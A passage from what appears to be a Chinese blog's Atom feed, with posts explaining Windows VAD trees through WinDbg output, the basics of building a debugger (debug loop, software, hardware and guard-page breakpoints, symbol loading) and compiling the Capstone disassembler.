    <content type="html"><![CDATA[<h2 id="VAD概念"><a href="#VAD概念" class="headerlink" title="VAD概念"></a>VAD概念</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>VAD其实没有过于复杂，由于本人总是忘记，遂写个记录方便以后查询.</p><p>内存分为物理内存和虚拟内存；操作系统和进程共享物理内存，进程独享虚拟内存；物理内存可以通过<code>CR3</code>寄存器在进程之间互相隔离，确保进程之间互不侵犯；2位下，每个进程独享<code>4GB</code>内存，怎么知道哪些内存已经使用过，<code>windwos</code>采用<code>virtual address descripot</code>自平衡二叉树来管理虚拟内存，低端的内存地址放在根节点左子树，高端内存地址放根节点右子树，大致的结构如下：每当进程调用<code>virtualAlloc</code>分配虚拟内存时，操作系统会先遍历这个树，看看还有哪些地方的虚拟内存还未使用</p><h3 id="64位环境下查找VAD"><a href="#64位环境下查找VAD" class="headerlink" title="64位环境下查找VAD"></a>64位环境下查找VAD</h3><p>在<code>EPROCESS</code>结构中保存着<code>VadRoot</code>根节点</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt _EPROCESS</span><br><span class="line">nt!_EPROCESS</span><br><span class="line">   +<span class="number">0x000</span> Pcb              : _KPROCESS</span><br><span class="line">   +<span class="number">0x160</span> ProcessLock      : _EX_PUSH_LOCK</span><br><span class="line">   +<span class="number">0x168</span> CreateTime       : _LARGE_INTEGER</span><br><span class="line">  [...]</span><br><span class="line">   +<span class="number">0x448</span> VadRoot          : _MM_AVL_TABLE</span><br><span class="line">   +<span class="number">0x488</span> AlpcContext      : _ALPC_PROCESS_CONTEXT</span><br><span class="line">   +<span class="number">0x4a8</span> TimerResolutionLink : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x4b8</span> RequestedTimerResolution : Uint4B</span><br><span class="line">   +<span class="number">0x4bc</span> ActiveThreadsHighWatermark : Uint4B</span><br><span class="line">   +<span class="number">0x4c0</span> SmallestTimerResolution : Uint4B</span><br><span class="line">   +<span class="number">0x4c8</span> TimerResolutionStackRecord : Ptr64 _PO_DIAG_STACK_RECORD</span><br></pre></td></tr></table></figure><p>64位<code>VAD</code>结构如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>: kd&gt; dt _MMVAD</span><br><span class="line">nt!_MMVAD</span><br><span class="line">   +<span class="number">0x000</span> u1               : &lt;unnamed-tag&gt;</span><br><span class="line">   +<span class="number">0x008</span> LeftChild        : Ptr64 _MMVAD<span class="comment">//左子树</span></span><br><span class="line">   +<span class="number">0x010</span> RightChild       : Ptr64 _MMVAD<span class="comment">//右子树</span></span><br><span class="line">   +<span class="number">0x018</span> StartingVpn      : Uint8B<span class="comment">//起始页</span></span><br><span class="line">   +<span class="number">0x020</span> EndingVpn        : Uint8B<span class="comment">//结束页</span></span><br><span class="line">   +<span class="number">0x028</span> u                : &lt;unnamed-tag&gt;</span><br><span class="line">   +<span class="number">0x030</span> PushLock         : _EX_PUSH_LOCK</span><br><span class="line">   +<span class="number">0x038</span> u5               : &lt;unnamed-tag&gt;</span><br><span class="line">   +<span class="number">0x040</span> u2               : &lt;unnamed-tag&gt;</span><br><span class="line">   +<span class="number">0x048</span> Subsection       : Ptr64 _SUBSECTION</span><br><span class="line">   +<span class="number">0x048</span> MappedSubsection : Ptr64 _MSUBSECTION</span><br><span class="line">   +<span class="number">0x050</span> FirstPrototypePte : Ptr64 _MMPTE</span><br><span class="line">   +<span class="number">0x058</span> LastContiguousPte : Ptr64 _MMPTE</span><br><span class="line">   +<span class="number">0x060</span> ViewLinks        : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x070</span> VadsProcess      : Ptr64 _EPROCESS</span><br></pre></td></tr></table></figure><p><code>!process 0 0</code>查看<code>EPROCESS</code>地址</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>: kd&gt; !<span class="built_in">process</span> <span class="number">0</span> <span class="number">0</span> </span><br><span class="line">**** NT ACTIVE PROCESS DUMP ****</span><br><span class="line">[...]</span><br><span class="line">PROCESS fffffa8004ae1b30</span><br><span class="line">    SessionId: <span class="number">1</span>  Cid: <span class="number">0</span>c60    Peb: <span class="number">7f</span>ffffd3000  ParentCid: <span class="number">062</span>c</span><br><span class="line">    DirBase: <span class="number">4716</span>c000  ObjectTable: fffff8a0027e1bf0  HandleCount:  <span class="number">70.</span></span><br><span class="line">    Image: calc.exe</span><br></pre></td></tr></table></figure><p>查看<code>VAD</code>管理各块内存属性</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>: kd&gt; !vad  fffffa8004ae1b30+<span class="number">0x440</span></span><br><span class="line">VAD             level      start      <span class="built_in">end</span>    commit</span><br><span class="line">c3504c4102210000: Unable to <span class="built_in">get</span> nt!_FILE_OBJECT.FileName.Buffer</span><br><span class="line">[...]          </span><br><span class="line">fffffa8004971d90 ( <span class="number">9</span>)         <span class="number">190</span>       <span class="number">199</span>        <span class="number">10</span> Private      READWRITE          </span><br><span class="line">fffffa800492d140 ( <span class="number">7</span>)         <span class="number">1</span>a0       <span class="number">1</span>af        <span class="number">16</span> Private      READWRITE          </span><br><span class="line">fffffa800461f0c0 ( <span class="number">8</span>)         <span class="number">1b</span>0       <span class="number">1</span>cc        <span class="number">29</span> Private      READWRITE          </span><br><span class="line">fffffa8004b54250 ( <span class="number">9</span>)         <span class="number">1</span>d0       <span class="number">1</span>ec        <span class="number">29</span> Private      READWRITE          </span><br><span class="line">fffffa8004865950 ( <span class="number">4</span>)         <span class="number">1f</span>0       <span class="number">26f</span>         <span class="number">9</span> Private      READWRITE          </span><br><span class="line">fffffa80041a4870 ( <span class="number">8</span>)         <span class="number">270</span>       <span class="number">2</span>a8        <span class="number">57</span> Private      READWRITE          </span><br><span class="line">fffffa8004568f70 ( <span class="number">7</span>)         <span class="number">2b</span>0       <span class="number">2e8</span>        <span class="number">57</span> Private      READWRITE          </span><br><span class="line">fffffa80041a5140 ( <span class="number">6</span>)         <span class="number">2f</span>0       <span class="number">2f</span>9        <span class="number">10</span> Private      READWRITE          </span><br><span class="line">fffffa80038a0b60 ( <span class="number">8</span>)         <span class="number">300</span>       <span class="number">312</span>        <span class="number">19</span> Private      READWRITE          </span><br><span class="line">fffffa8004b65580 ( <span class="number">9</span>)         <span class="number">320</span>       <span class="number">329</span>        <span class="number">10</span> Private      READWRITE          </span><br><span class="line">fffffa800455ded0 ( <span class="number">7</span>)         <span class="number">330</span>       <span class="number">42f</span>       <span class="number">105</span> Private      READWRITE          </span><br><span class="line">fffffa8004b50750 ( <span class="number">8</span>)         <span class="number">430</span>       <span class="number">52f</span>        <span class="number">46</span> Private      READWRITE          </span><br><span class="line">fffffa80044bc350 ( <span class="number">5</span>)         <span class="number">530</span>       <span class="number">6b</span>7         <span class="number">0</span> Mapped       READONLY           Pagefile-backed section</span><br><span class="line">fffffa8004436bd0 ( <span class="number">8</span>)         <span class="number">6</span>c0       <span class="number">840</span>         <span class="number">0</span> Mapped       READONLY           Pagefile-backed section</span><br></pre></td></tr></table></figure><p>接下来就可以递归遍历二叉树得到VAD树了</p><p> 当内存使用完毕，调用<code>VirtualFree</code>，将内存从<code>VAD</code>卸下，后续再次遍历时才能继续使用！正常情况下，如果要卸载dll，可以调用<code>windwos</code>提供的<code>freeLibrary</code>接口(释放后再使用，躲避检测)，里面有关键的函数：<code>ZwUnmapViewOfSection</code>，可以直接把dll对应的内存从VAD中删除,<code>ZwUnmapViewOfSection</code> 是傀儡执行恶意的代码的关键函数（一般傀儡进程或者直接注入的shellcode都是<code>Private</code>(调用<code>VirtualAlloc</code>)权限，并且具有<code>EXECUTE</code>属性,可以使用此方法检测傀儡进程）</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;VAD概念&quot;&gt;&lt;a href=&quot;#VAD概念&quot; class=&quot;headerlink&quot; title=&quot;VAD概念&quot;&gt;&lt;/a&gt;VAD概念&lt;/h2&gt;&lt;h3 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简
      
    
    </summary>
    
    
      <category term="技巧" scheme="http://yeanhoo.gitee.io/categories/%E6%8A%80%E5%B7%A7/"/>
    
    
      <category term="VAD" scheme="http://yeanhoo.gitee.io/tags/VAD/"/>
    
  </entry>
  
  <entry>
    <title>调试器基础0x2(调试器框架基础知识)</title>
    <link href="http://yeanhoo.gitee.io/2021/04/02/%E8%B0%83%E8%AF%95%E5%99%A8%E5%9F%BA%E7%A1%800x2(%E8%B0%83%E8%AF%95%E5%99%A8%E6%A1%86%E6%9E%B6%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86)/"/>
    <id>http://yeanhoo.gitee.io/2021/04/02/%E8%B0%83%E8%AF%95%E5%99%A8%E5%9F%BA%E7%A1%800x2(%E8%B0%83%E8%AF%95%E5%99%A8%E6%A1%86%E6%9E%B6%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86)/</id>
    <published>2021-04-02T15:08:49.049Z</published>
    <updated>2021-04-02T15:08:30.623Z</updated>
    
    <content type="html"><![CDATA[<h2 id="调试器基础0x2-调试器框架基础知识"><a href="#调试器基础0x2-调试器框架基础知识" class="headerlink" title="调试器基础0x2(调试器框架基础知识)"></a>调试器基础0x2(调试器框架基础知识)</h2><h3 id="创建-附加"><a href="#创建-附加" class="headerlink" title="创建/附加"></a>创建/附加</h3><p>调试器首先需要实现的功能是能够附加到正在运行的进程或者创建一个被调试进程，当然，调试器必须与被调试进程具有交互的能力，这样调试器才能用来操作被调试进程。可以通过<a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms679295(v=vs.85).aspx" target="_blank" rel="noopener">DebugActiveProcess</a>函数并指定目标的进程标识符来实现的。或者，也可以通过调用<a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms682425(v=vs.85).aspx" target="_blank" rel="noopener">CreateProcess</a>来完成带有<code>DEBUG_PROCESS</code>或<code>DEBUG_ONLY_THIS_PROCESS</code>创建标志。后一种方法将创建一个新进程并将其附加到该进程，而不是附加到已在系统上运行的进程。附加后，调试器可以使用<a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms679307(v=vs.85).aspx" target="_blank" rel="noopener">DebugSetProcessKillOnExit</a>指定有关是否在分离时终止进程的策略。最后，分离过程是对<a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms679296(v=vs.85).aspx" target="_blank" rel="noopener">DebugActiveProcessStop</a>的直接调用。</p><h3 id="调试循环"><a href="#调试循环" class="headerlink" title="调试循环"></a>调试循环</h3><p>调试器的核心组件是调试循环。 这是负责等待调试事件，处理所述事件，然后等待下一个事件（即循环）的部分。 在<code>Windows</code>平台上，这非常简单。 实际上，它非常简单，微软就此步骤需要完成的工作编写了一个简短的<a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms681675(v=vs.85).aspx" target="_blank" rel="noopener">调试循环Demo</a>页面。 大致步骤是（在一个循环中）调试器调用<a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms681423(v=vs.85).aspx" target="_blank" rel="noopener">WaitForDebugEvent</a> ，它等待来自进程的调试事件。 这些调试事件在此处列举，通常是与进程和线程创建/销毁，DLL的加载或卸载，引发的任何异常或调试器专用的调试字符串输出有关的事件。 该函数返回后，将使用与特定调试事件相关的信息填充<code>DEBUG_EVENT</code>结构。 至此，调试器的工作就是处理事件。 处理事件之后，处理程序必须向<a href="http://www.codereversing.com/blog/archives/msdn.microsoft.com/en-us/library/windows/desktop/ms679285(v=vs.85).aspx" target="_blank" rel="noopener">ContinueDebugEvent</a>返回处理状态，<code>dwContinueStatus</code>是一个<code>DWOR</code>类型变量，用于告诉引发事件的线程在处理事件后如何继续执行。对于大多数事件，即<code>CREATE_PROCESS_DEBUG_EVENT</code>，<code>LOAD_DLL_DEBUG_EVENT</code>等等，您想要继续执行，因为这些事件并未反映出程序行为的任何错误，而是通知调试器更改过程状态的事件。通过选择<code>DBG_CONTINUE</code>作为继续状态来完成此操作。对于异常情况，例如导致未定义程序行为的异常（例如访问冲突，非法指令执行，除零等），这是程序无法自己解决的问题。此时的调试器工作是收集和显示与崩溃有关的信息，并且在大多数情况下，终止进程。对于这些异常，终止可以在处理程序内部进行，或者调试器可以选择继续使用<code>DBG_EXCEPTION_NOT_HANDLED</code>进行调试事件返回。保持原状，表示调试器放弃处理此条异常。几乎所有情况下，程序随后会立即终止。但是，有时会出现一些极端情况，尤其是在恶意软件中，在该过程中，进程将安装其自己的运行时异常处理程序作为一种混淆技术，并生成自己的运行时异常以在该处理程序中进行处理以实现某些功能。在这种情况下继续执行异常不会导致崩溃，因为在调试器将其沿着异常处理程序链转发后，该进程便能够处理其自身的异常。</p><h3 id="断点"><a href="#断点" class="headerlink" title="断点"></a>断点</h3><p>断点可以简单地定义为正在执行的代码中导致故意中止执行的位置。在调试器的上下文中，这很有用，因为它允许调试器在什么也没有发生的时间（即过程实际上“中断”）时检查过程。当目标处于中断状态时，调试器中会看到的典型功能是查看和修改寄存器/内存，打印断点周围区域的反汇编列表，进入或移至汇编指令或源代码行的能力，和其他相关的诊断功能。断点本身可以有几种不同的形式。</p><p><strong>硬件中断断点</strong><br>硬件中断断点可能是在调试器中了解和实现的最常见和最简单的断点。这些特定于<code>x86</code>和<code>x64</code>体系结构，并通过使用硬件支持的指令来实现，该指令专门用于生成调试器专用的软件中断。该指令的操作码为<code>0xCC</code>，它与<code>INT 3</code>指令匹配。大多数调试器实现此目的的方式是将期望地址（即断点地址）处的操作码替换为<code>0xCC</code>操作码。调用代码后，中断（<code>EXCEPTION_BREAKPOINT</code>），调试器将处理并为用户提供执行上述调试功能的选项。当用户完成检查该地址处的程序状态并希望继续时，调试器将替换原始指令，确保执行地址（<code>EIP</code>或<code>RIP</code>寄存器，取决于体系架构）指向该原始地址，并且继续执行。</p><p>但是，出现了一个有趣的问题。当原始指令被替换回时，断点将丢失。如果断点仅被命中一次，这可能没问题，但这种情况很少发生。之后需要一种方法可以立即重新启用该断点。这是通过设置<code>EFlags</code>（或<code>x64</code>的<code>RFlags</code>）寄存器将处理器设置为单步模式来完成的。幸运的是，通过启用第8位（即与<code>0x100</code>进行“或”运算）可以很容易地实现这一点。当<code>EXCEPTION_BREAKPOINT</code>异常被处理并恢复执行，将有另一个异常，<code>EXCEPTION_SINGLE_STEP</code>，引发下一条执行的指令。此时，调试器可以重新启用上一条指令的断点并恢复执行。</p><p><strong>硬件调试寄存器</strong><br>第二种断点实现技术也特定于<code>x86</code>和<code>x64</code>体系结构，并利用了指令集提供的特定调试寄存器。这些是调试寄存器<code>DR0</code>，<code>DR1</code>，<code>DR2</code>，<code>DR3</code>和<code>DR7</code>。前四个寄存器用于保存硬件断点将断开的地址。使用这些意味着对于整个程序，最多可以有四个硬件断点。<code>DR7</code>寄存器用于控制这些寄存器的使能，位<em>0、2、4、6</em>对应于<code>DR0</code>，…，<code>DR3</code>的开/关。此外，位<code>16-17</code>、<code>20-21</code>、<code>24-25</code>和<code>28-29</code>充当<code>DR0</code>，…，<code>DR3</code>的位掩码，用于触发这些断点的条件，执行时为<code>00</code>，读取时为<code>01</code>，写入时为<code>11</code> 。</p><p>在<code>Windows</code>平台上设置这些断点有些棘手。它们<strong>必须</strong>在进程主线程上设置。这涉及获取主线程，使用至少<code>THREAD_GET_CONTEXT</code>和<code>THREAD_SET_CONTEXT</code>特权打开该线程的句柄，并使用带有新添加的调试寄存器的<a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms679362(v=vs.85).aspx" target="_blank" rel="noopener">GetThreadContext</a> / <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms680632(v=vs.85).aspx" target="_blank" rel="noopener">SetThreadContext</a>获取/设置线程上下文，以反映更改。请注意，没有修改内存中的可执行代码来设置这些断点。这与之前必须替换操作码的情况不同。这些是通过更改硬件寄存器的内容来设置和取消设置的断点。设置这些参数后将发生的情况是，该过程将引发在地址处命中指令后会发生<code>EXCEPTION_SINGLE_STEP</code>异常，然后调试器将以与上一节中的方式几乎相同的方式对其进行处理。由于数量的限制，这些内容不会在本文的示例断点代码中显示，但是出于完整性的考虑，最终可能会在以后写出来。我(<code>原文作者</code>)已经写了自己的使用情况在<code>API</code>钩子<a href="http://www.codereversing.com/blog/?p=76" target="_blank" rel="noopener">以前的文章</a>（请原谅在一开始死链接）。调试器的实现与那里的实现非常接近。</p><p><strong>软件断点</strong><br>最后一类断点完全在软件中执行，并且与操作系统的功能密切相关。它们的另一个名称是内存断点。它们结合了中断断点的一些最佳功能，即具有任意数量的能力，以及硬件断点的最佳功能，这就是执行代码中的任何内容都不需要覆盖。但是，存在一个主要缺点：由于其实现，它们使代码的执行速度大大降低。</p><p>这些不是在地址级别实现的，而是在<strong>页面</strong>级别实现的。这些工作原理是使用<a href="http://msdn.microsoft.com/en-us/library/windows/desktop/aa366899(v=vs.85).aspx" target="_blank" rel="noopener">VirtualProtectEx</a>将要设置断点的地址的页面权限更改为<a href="http://msdn.microsoft.com/en-us/library/windows/desktop/aa366549(v=vs.85).aspx" target="_blank" rel="noopener">保护页面的</a>页面权限。当页面上的<strong>任何</strong>指令将被访问时，将抛出<code>EXCEPTION_GUARD_PAGE</code>异常。调试器将处理此异常，并检查有问题的地址是否是断点地址的地址。如果是这样，调试器可以像执行其他任何断点一样执行通常的处理/用户提示。如果不是，则调试器必须执行一些额外的步骤(如抛出异常)。</p><p>根据文档，保护页保护将在提升后从页面上删除。这意味着一旦处理了异常并继续执行，此后的任何访问都将不会生成<code>EXCEPTION_GUARD_PAGE</code>异常。因此，如果所访问的指令不是所需的断点地址，则断点将丢失。为了解决这个问题，将使用与硬件中断断点部分介绍的技术类似的技术。处理器将进入单步模式并继续执行。在下一条指令上，将有一个<code>EXCEPTION_SINGLE_STEP</code>引发异常。这将由调试器处理，并且将在页面上重新启用保护页面属性。此实现也将不在本文中讨论，但将来可能会涉及到。我以前写过关于它，也是在API挂钩的情况下，<a href="http://www.codereversing.com/blog/?p=79" target="_blank" rel="noopener">在这里</a>。</p><h3 id="调试符号"><a href="#调试符号" class="headerlink" title="调试符号"></a>调试符号</h3><p>在最简单的定义下，调试符号是一条信息，它显示了已编译程序的特定部分如何映射回源级别。例如，调试符号可能会告诉您有关内存地址中变量名称的信息，或一系列汇编指令映射到的代码行以及在哪个文件中的信息。它们通常在调试构建期间生成，用于为正在调试（或逆向工程）一段代码的开发人员提供一些清晰度。一种语言没有通用的调试符号格式，并且它们在编译器之间可能会有所不同。在现代Windows平台上，调试符号以<em>程序数据库</em>（<a href="https://devblogs.microsoft.com/cppblog/whats-inside-a-pdb-file/" target="_blank" rel="noopener">PDB</a>）文件的形式出现，以<strong><em>.pdb</em></strong>扩展名结尾。</p><p>初始化符号处理程序非常简单：仅涉及调用<a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms681351(v=vs.85).aspx" target="_blank" rel="noopener">SymInitialize</a>。该函数具有一个进程句柄，该句柄在附加时由调试器打开。用户搜索路径还有一个参数可以找到<code>PDB</code>文件，第三个参数可以指定调试器是否要枚举进程中所有已加载的模块并加载它们的符号。对于附加调试器，请指定此行为取决于情况。在某些情况下，例如调试器创建了要调试的目标进程，或者使用了<a href="http://msdn.microsoft.com/en-us/library/yx9zd12s.aspx" target="_blank" rel="noopener">延迟加载的DLL</a>，可能会导致某些符号无法加载。此外，如果此第三个参数设置为<em>true</em>并且在接收到所有<code>LOAD_DLL_DEBUG_EVENT</code>事件之前初始化了符号处理程序，则可能不会加载某些符号。</p><p>调试器的一个有用功能可能是在内部枚举模块的所有符号。 这样可以在以后存储和快速查找。 或者，它可以为用户提供图形显示，并可以从其名称轻松导航到符号地址。 枚举符号是一个两步过程：首先调用<code>SymLoadModuleEx</code>来加载模块的符号表，然后可以使用模块的基地址来调用<code>SymEnumSymbols</code>。 <code>SymEnumSymbols</code>将<code>PSYM_ENUMERATESYMBOLS_CALLBACK</code>类型的回调作为参数。 该回调将针对在模块符号表中找到的每个符号进行调用，并将具有<code>SYMBOL_INFO</code>结构，该结构显示有关该符号的信息，例如其名称，地址，是否为寄存器，如果其为常数则是什么值 等。 </p><h3 id="原文链接"><a href="#原文链接" class="headerlink" title="原文链接"></a>原文链接</h3><p><a href="http://www.codereversing.com/blog/archives/168" target="_blank" rel="noopener">http://www.codereversing.com/blog/archives/168</a></p><p><a href="http://www.codereversing.com/blog/archives/169" target="_blank" rel="noopener">http://www.codereversing.com/blog/archives/169</a></p><p><a href="http://www.codereversing.com/blog/archives/170" target="_blank" rel="noopener">http://www.codereversing.com/blog/archives/170</a></p><p><a href="http://www.codereversing.com/blog/archives/171" target="_blank" rel="noopener">http://www.codereversing.com/blog/archives/171</a></p><p><a href="http://www.codereversing.com/blog/archives/172" target="_blank" rel="noopener">http://www.codereversing.com/blog/archives/172</a></p><h3 id="参考代码"><a href="#参考代码" class="headerlink" title="参考代码"></a>参考代码</h3><p><a href="https://docs.microsoft.com/en-us/windows/win32/debug/writing-the-debugger-s-main-loop?redirectedfrom=MSDN" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/windows/win32/debug/writing-the-debugger-s-main-loop?redirectedfrom=MSDN</a></p><p><a href="https://github.com/lracker/-MyDebugger" target="_blank" rel="noopener">https://github.com/lracker/-MyDebugger</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;调试器基础0x2-调试器框架基础知识&quot;&gt;&lt;a href=&quot;#调试器基础0x2-调试器框架基础知识&quot; class=&quot;headerlink&quot; title=&quot;调试器基础0x2(调试器框架基础知识)&quot;&gt;&lt;/a&gt;调试器基础0x2(调试器框架基础知识)&lt;/h2&gt;&lt;h3 id=
      
    
    </summary>
    
    
      <category term="C\C++" scheme="http://yeanhoo.gitee.io/categories/C-C/"/>
    
    
      <category term="调试器" scheme="http://yeanhoo.gitee.io/tags/%E8%B0%83%E8%AF%95%E5%99%A8/"/>
    
  </entry>
  
  <entry>
    <title>调试器基础0x1(环境配置-代码思路)</title>
    <link href="http://yeanhoo.gitee.io/2021/04/02/%E8%B0%83%E8%AF%95%E5%99%A8%E5%9F%BA%E7%A1%800x1(%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE-%E4%BB%A3%E7%A0%81%E6%80%9D%E8%B7%AF)/"/>
    <id>http://yeanhoo.gitee.io/2021/04/02/%E8%B0%83%E8%AF%95%E5%99%A8%E5%9F%BA%E7%A1%800x1(%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE-%E4%BB%A3%E7%A0%81%E6%80%9D%E8%B7%AF)/</id>
    <published>2021-04-02T15:08:48.992Z</published>
    <updated>2021-04-02T15:08:14.657Z</updated>
    
    <content type="html"><![CDATA[<h2 id="调试器基础0x1-环境配置-代码思路"><a href="#调试器基础0x1-环境配置-代码思路" class="headerlink" title="调试器基础0x1(环境配置/代码思路)"></a>调试器基础0x1(环境配置/代码思路)</h2><h3 id="编译选项："><a href="#编译选项：" class="headerlink" title="编译选项："></a>编译选项：</h3><p>配置属性-&gt;高级-&gt;字符集-&gt;使用多字节字符集</p><p>配置属性-&gt;C/C++-&gt;语言-&gt;符合模式-&gt;否</p><h3 id="反汇编引擎："><a href="#反汇编引擎：" class="headerlink" title="反汇编引擎："></a>反汇编引擎：</h3><p><code>Capstone</code>反汇编程序框架<strong>4.0.2</strong>版！<a href="https://github.com/aquynh/capstone/releases/tag/4.0.2" target="_blank" rel="noopener">2020年5月8日发布</a></p><p>用法参考 <a href="https://xz.aliyun.com/t/5753" target="_blank" rel="noopener">先知社区</a></p><h3 id="代码思路："><a href="#代码思路：" class="headerlink" title="代码思路："></a>代码思路：</h3><ul><li><p>创建/附加调试进程</p></li><li><p>调试循环</p></li><li><p>捕获异常消息</p></li><li><p>异常处理</p></li><li><p>交互</p></li></ul><h3 id="难点："><a href="#难点：" class="headerlink" title="难点："></a>难点：</h3><ul><li><p>循环与处理</p></li><li><p>下断与修复</p></li><li><p>内存断点精准性</p></li></ul><h3 id="开源代码："><a href="#开源代码：" class="headerlink" title="开源代码："></a>开源代码：</h3><p><a href="https://github.com/yeanhoo/Debugger" target="_blank" rel="noopener">https://github.com/yeanhoo/Debugger</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;调试器基础0x1-环境配置-代码思路&quot;&gt;&lt;a href=&quot;#调试器基础0x1-环境配置-代码思路&quot; class=&quot;headerlink&quot; title=&quot;调试器基础0x1(环境配置/代码思路)&quot;&gt;&lt;/a&gt;调试器基础0x1(环境配置/代码思路)&lt;/h2&gt;&lt;h3 id=
      
    
    </summary>
    
    
      <category term="C\C++" scheme="http://yeanhoo.gitee.io/categories/C-C/"/>
    
    
      <category term="调试器" scheme="http://yeanhoo.gitee.io/tags/%E8%B0%83%E8%AF%95%E5%99%A8/"/>
    
  </entry>
  
  <entry>
    <title>调试器基础0x3(反汇编引擎使用)</title>
    <link href="http://yeanhoo.gitee.io/2021/04/02/%E8%B0%83%E8%AF%95%E5%99%A8%E5%9F%BA%E7%A1%800x3(%E5%8F%8D%E6%B1%87%E7%BC%96%E5%BC%95%E6%93%8E%E4%BD%BF%E7%94%A8)/"/>
    <id>http://yeanhoo.gitee.io/2021/04/02/%E8%B0%83%E8%AF%95%E5%99%A8%E5%9F%BA%E7%A1%800x3(%E5%8F%8D%E6%B1%87%E7%BC%96%E5%BC%95%E6%93%8E%E4%BD%BF%E7%94%A8)/</id>
    <published>2021-04-02T15:08:48.890Z</published>
    <updated>2021-04-02T15:08:41.876Z</updated>
    
    <content type="html"><![CDATA[<h2 id="调试器基础0x3-反汇编引擎使用"><a href="#调试器基础0x3-反汇编引擎使用" class="headerlink" title="调试器基础0x3(反汇编引擎使用)"></a>调试器基础0x3(反汇编引擎使用)</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p><strong>Capstone</strong>是一个轻量级的多平台，多体系结构的拆卸框架。</p><ul><li><p><code>Capstone</code>反汇编程序框架<strong>4.0.2</strong>版！<a href="https://github.com/aquynh/capstone/releases/tag/4.0.2" target="_blank" rel="noopener">2020年5月8日发布</a></p></li><li><p>多体系结构：<em>Arm</em>，<em>Arm64</em>（<em>Armv8</em>），<em>BPF</em>，<em>以太坊虚拟机</em>，<em>M68K</em>，<em>M680X</em>，<em>Mips</em>，<em>MOS65XX</em>，<em>PowerPC</em>，<em>RISCV</em>，<em>Sparc</em>，<em>SystemZ</em>，<em>TMS320C64X</em>，<em>Web Assembly</em>，<em>XCore</em>和<em>X86</em>（包括<em>X86_64</em>）（<a href="https://www.capstone-engine.org/arch.html" target="_blank" rel="noopener">详细信息</a>）。</p></li><li><p>干净/简单/轻巧/直观的中性API。</p></li><li><p>提供有关反汇编指令（其他人称为“分解器”）的详细信息。</p></li><li><p>提供反汇编指令的一些语义，例如读取和写入的隐式寄存器列表。</p></li><li><p>用纯C语言实现，具有<em>D</em>，<em>Clojure</em>，<em>F＃</em>，<em>Common Lisp</em>，<em>Visual Basic</em>，<em>PHP</em>，<em>PowerShell</em>，<em>Haskell</em>，<em>Perl</em>，<em>Python</em>，<em>Ruby</em>，<em>C＃</em>，<em>NodeJS</em>，<em>Java</em>，<em>GO</em>，<em>C ++</em>，<em>OCaml</em>，<em>Lua</em>，<em>Rust</em>，<em>Delphi的绑定</em>，<em>免费提供Pascal</em>和<em>Vala</em>。</p></li><li><p><em>Windows*和</em> nix的本机支持（已确认<em>Mac OSX<em>，</em>iOS<em>，</em>Android<em>，</em>Linux*，</em> BSD和<em>Solaris</em>）。</p></li><li><p>设计上是线程安全的。</p></li><li><p>对嵌入固件或OS内核的特殊支持。</p></li><li><p>高性能，适合恶意软件分析（能够处理各种<em>X86</em>恶意软件技巧）。</p></li><li><p>在开源<em>BSD</em>许可下分发。</p></li></ul><h3 id="源码编译"><a href="#源码编译" class="headerlink" title="源码编译"></a>源码编译</h3><ul><li><p>windows环境下使用VS进行编译,打开<code>capstone-4.0.2\msvc\capstone.sln</code>，选用<code>Release</code>版本直接进行编译即可。</p></li><li><p>将编译好的<code>lib</code>和<code>dll</code>根据需要拷入自己的项目目录；</p></li><li><p>将<code>capstone-4.0.2\include\capstone</code>拷入自己的项目目录。</p></li><li><p>在自己的项目头文件中包含<code>capstone.h</code>，并链接<code>capstone.lib</code>库即可</p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
